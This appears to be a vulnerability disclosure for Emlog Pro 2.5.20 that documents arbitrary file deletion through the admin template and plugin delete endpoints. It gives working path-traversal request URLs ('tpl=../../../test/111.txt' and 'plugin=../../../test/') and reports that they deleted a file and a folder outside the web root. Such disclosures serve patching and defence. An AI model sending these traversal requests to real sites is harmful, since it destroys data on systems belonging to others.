Emlog Pro 2.5.20
Arbitrary file deletion vulnerability in the backend interface.

1. The functionality is primarily located in the backend template and plugin deletion process, as shown in the figure:
Template:
<img width="415" height="270" alt="image" src="https://github.com/user-attachments/assets/6a11c857-6739-4541-801d-eea24d423b3f" />


plugins：

<img width="415" height="293" alt="image" src="https://github.com/user-attachments/assets/608a4d5b-0cf5-4ba0-b3e1-01bf045976e1" />


1.Capture and delete APIs
Appearance：
http://localhost/admin/template.php?action=del&tpl=test&token=a4539d9677172ad9e96c7e02ebac0956f00babc9

<img width="415" height="283" alt="image" src="https://github.com/user-attachments/assets/e6cf4080-6063-42c0-ad5f-9a96d26be19b" />

<img width="415" height="273" alt="image" src="https://github.com/user-attachments/assets/1cc4c759-5a77-49de-9bd2-b0cc01b4ce9f" />


plugins：
http://localhost/admin/plugin.php?action=del&plugin=tips/tips.php&token=a4539d9677172ad9e96c7e02ebac0956f00babc9

<img width="416" height="258" alt="image" src="https://github.com/user-attachments/assets/48f217e7-d7cb-4026-81a4-94ae0b185796" />


2.Build the deletion payload
First, based on the deletion parameters and the location of template and plugin functions, the deletion starts in the templates and plugins of the content.

<img width="416" height="141" alt="image" src="https://github.com/user-attachments/assets/96fd4ad6-4d1d-4d4a-adcc-a4c98feb73c5" />

<img width="416" height="141" alt="image" src="https://github.com/user-attachments/assets/6e71efb7-3447-4c48-9a10-ac2b825600aa" />


So create a test folder outside the web application and perform directory traversal to delete the specified file:

<img width="415" height="241" alt="image" src="https://github.com/user-attachments/assets/108b15fb-1913-4a1a-8202-12db534fca8b" />

<img width="415" height="117" alt="image" src="https://github.com/user-attachments/assets/db9b3ef6-1495-4b44-b964-56e0924d2f0c" />



Try running the payload to delete:
The template interface successfully deleted 111.txt
http://localhost/admin/template.php?action=del&tpl=../../../test/111.txt&token=a4539d9677172ad9e96c7e02ebac0956f00babc9

<img width="415" height="232" alt="image" src="https://github.com/user-attachments/assets/0889bda6-8f4a-4b34-8df6-7db0fc12f06f" />


The plugin interface successfully deleted the test folder:
http://localhost/admin/plugin.php?action=del&plugin=../../../test/&token=a4539d9677172ad9e96c7e02ebac0956f00babc9

<img width="416" height="259" alt="image" src="https://github.com/user-attachments/assets/29cafc98-f366-4a06-9ae9-8197b27d8527" />


4. This implements the arbitrary file deletion function of emlog pro, which can destroy the integrity and stability of the system.
